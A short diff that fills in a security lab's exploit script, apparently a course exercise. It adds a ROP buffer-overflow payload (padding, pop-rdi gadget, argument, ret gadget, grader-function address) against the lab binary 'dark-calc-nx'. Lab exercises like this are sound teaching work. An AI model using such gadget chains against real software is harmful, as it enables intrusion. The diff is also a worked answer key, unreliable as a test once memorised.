@@ -1,10 +1,15 @@
-#!/usr/bin/env python3
-"""Task 3: build the payload for attack/dark-calc-nx.
-
-TODO: replace the empty payload with the bytes required by the lab.
-"""
 import sys
+import struct
 
-payload = b""
+pop_rdi_ret = 0x401a33
+ret_gadget  = 0x401a34
+grade_eval  = 0x401978
+
+payload  = b'A' * 24
+payload += struct.pack('<Q', pop_rdi_ret)
+payload += struct.pack('<Q', 4)
+payload += struct.pack('<Q', ret_gadget)
+payload += struct.pack('<Q', grade_eval)
+payload += b'\n'
 
 sys.stdout.buffer.write(payload)
